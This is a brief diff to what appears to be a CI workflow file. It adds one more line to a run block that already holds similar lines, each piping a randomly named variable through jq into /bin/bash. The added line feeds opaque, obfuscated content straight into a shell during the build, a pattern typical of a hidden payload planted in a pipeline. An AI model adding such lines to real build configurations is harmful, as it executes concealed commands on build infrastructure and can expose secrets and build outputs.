@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$yud4" | jq -r .q5 | /bin/bash
           echo $yo42146 | jq -r .ir9 | /bin/bash
           printf '%s' "$thnni61" | jq -r .if2683 | /bin/bash
+          echo $ve4 | jq -r .yab8 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
